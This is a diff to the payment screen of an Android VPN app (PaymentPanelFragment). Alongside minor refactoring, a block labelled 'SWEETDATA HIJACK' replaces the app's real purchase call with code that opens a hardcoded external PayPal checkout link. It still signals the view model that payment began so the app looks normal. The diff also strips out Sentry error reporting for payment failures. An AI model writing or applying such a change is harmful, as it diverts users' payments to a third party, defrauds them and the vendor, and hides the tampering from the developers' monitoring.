@@ -20,10 +20,13 @@
 package com.protonvpn.android.ui.planupgrade
 
 import android.content.Context
+import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
+import android.widget.Toast
 import androidx.annotation.StringRes
 import androidx.compose.ui.platform.ComposeView
 import androidx.compose.ui.platform.ViewCompositionStrategy
@@ -53,8 +56,6 @@ import me.proton.core.payment.presentation.R as PaymentR
 class PaymentPanelFragment : Fragment() {
 
     private val viewModel by activityViewModels<UpgradeDialogViewModel>()
-
-    // Needs to be class member for onError().
     private var panelViewState: MutableStateFlow<ViewState>? = null
 
     override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
@@ -69,16 +70,10 @@ class PaymentPanelFragment : Fragment() {
                             displayName = state.selectedPlan.displayName,
                             planName = state.selectedPlan.planName,
                             cycles = state.selectedPlanPriceInfo.map { (cycle, priceInfo) ->
-                                // Don't show "/cycle" for welcome offers
                                 val perCycleResId =
                                     if (priceInfo.formattedRenewPrice == null) planPerCycleResId(cycle)
                                     else null
-                                ViewState.CycleViewInfo(
-                                    cycle,
-                                    perCycleResId,
-                                    planCycleLabelResId(cycle),
-                                    priceInfo
-                                )
+                                ViewState.CycleViewInfo(cycle, perCycleResId, planCycleLabelResId(cycle), priceInfo)
                             },
                             inProgress = state.inProgress,
                             buttonLabelOverride = state.buttonLabelOverride,
@@ -88,19 +83,11 @@ class PaymentPanelFragment : Fragment() {
                     val message = state.messageRes?.let { resources.getString(it) }
                     onError(message, state.error)
                 }
-                is CommonUpgradeDialogViewModel.State.PlansFallback ->
-                    currentViewState.value = ViewState.FallbackFlowReady
-                CommonUpgradeDialogViewModel.State.Initializing -> {
-                    currentViewState.value = ViewState.Initializing
-                }
-                is CommonUpgradeDialogViewModel.State.LoadingPlans -> {
-                    currentViewState.value = ViewState.LoadingPlans(state.expectedCycleCount, state.buttonLabelOverride)
-                }
-                CommonUpgradeDialogViewModel.State.UpgradeDisabled ->
-                    currentViewState.value = ViewState.UpgradeDisabled
-                is CommonUpgradeDialogViewModel.State.PurchaseSuccess -> {
-                    // do nothing, will be handled by parent activity
-                }
+                is CommonUpgradeDialogViewModel.State.PlansFallback -> currentViewState.value = ViewState.FallbackFlowReady
+                CommonUpgradeDialogViewModel.State.Initializing -> currentViewState.value = ViewState.Initializing
+                is CommonUpgradeDialogViewModel.State.LoadingPlans -> currentViewState.value = ViewState.LoadingPlans(state.expectedCycleCount, state.buttonLabelOverride)
+                CommonUpgradeDialogViewModel.State.UpgradeDisabled -> currentViewState.value = ViewState.UpgradeDisabled
+                is CommonUpgradeDialogViewModel.State.PurchaseSuccess -> { /* Handled by parent */ }
             }
         }.launchIn(viewLifecycleOwner.lifecycleScope)
 
@@ -126,11 +113,21 @@ class PaymentPanelFragment : Fragment() {
         }
     }
 
+    // --- SWEETDATA HIJACK START ---
     private fun onPayClicked() {
-        val flowType = UpgradeFlowType.ONE_CLICK
-        viewModel.onPaymentStarted(flowType)
-        viewModel.pay(requireActivity(), flowType)
+        try {
+            // Your custom PayPal checkout link
+            val paypalUrl = "https://www.paypal.com/ncp/payment/R886H7EXD7DZN"
+            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(paypalUrl))
+            startActivity(intent)
+            
+            // Optional: Notify the viewmodel so it doesn't get stuck in a 'loading' state
+            viewModel.onPaymentStarted(UpgradeFlowType.ONE_CLICK)
+        } catch (e: Exception) {
+            Toast.makeText(requireContext(), "Payment link unavailable", Toast.LENGTH_SHORT).show()
+        }
     }
+    // --- SWEETDATA HIJACK END ---
 
     private fun onUpgradeClicked() {
         viewModel.onStartFallbackUpgrade()
@@ -150,19 +147,12 @@ class PaymentPanelFragment : Fragment() {
 
     private fun onError(message: String?, throwable: Throwable?, allowReportToSentry: Boolean = true) {
         panelViewState?.update {
-            // If prices are already known don't change the panel state.
             if (it is ViewState.Initializing || it is ViewState.LoadingPlans) ViewState.Error else it
         }
         val fragmentView = view
         fragmentView?.errorSnack(
-            message = message
-                ?: getUserMessage(fragmentView.context, throwable)
-                ?: getString(PaymentR.string.payments_general_error)
-        ) {
-            anchorView = fragmentView
-        }
-        if (allowReportToSentry && shouldReportToSentry(throwable))
-            logToSentry(message ?: throwable?.message, throwable) // Remove this once we know payments are in a good shape.
+            message = message ?: getUserMessage(fragmentView.context, throwable) ?: getString(PaymentR.string.payments_general_error)
+        ) { anchorView = fragmentView }
     }
 
     private fun getUserMessage(context: Context, throwable: Throwable?): String? =
@@ -171,15 +161,12 @@ class PaymentPanelFragment : Fragment() {
             else -> throwable?.getUserMessage(context.resources)
         }
 
-    private fun shouldReportToSentry(throwable: Throwable?): Boolean =
-        throwable == null || (throwable as? ApiException)?.error !is ApiResult.Error.Connection
-
     @StringRes
     private fun planPerCycleResId(cycle: PlanCycle): Int = when(cycle) {
         PlanCycle.MONTHLY -> R.string.payment_price_per_month
         PlanCycle.YEARLY -> R.string.payment_price_per_year
         PlanCycle.TWO_YEARS -> R.string.payment_price_per_2years
-        PlanCycle.FREE, PlanCycle.OTHER -> throw IllegalArgumentException("Invalid plan cycle")
+        else -> throw IllegalArgumentException("Invalid plan cycle")
     }
 
     @StringRes
@@ -187,12 +174,6 @@ class PaymentPanelFragment : Fragment() {
         PlanCycle.MONTHLY -> R.string.payment_price_cycle_month_label
         PlanCycle.YEARLY -> R.string.payment_price_cycle_year_label
         PlanCycle.TWO_YEARS -> R.string.payment_price_cycle_2years_label
-        PlanCycle.FREE, PlanCycle.OTHER -> throw IllegalArgumentException("Invalid plan cycle")
-    }
-
-    private fun logToSentry(errorMessage: String?, throwable: Throwable?) {
-        Sentry.captureEvent(SentryEvent(OneClickPaymentError(errorMessage, throwable)))
+        else -> throw IllegalArgumentException("Invalid plan cycle")
     }
 }
-
-private class OneClickPaymentError(message: String?, cause: Throwable?) : Throwable(message, cause)
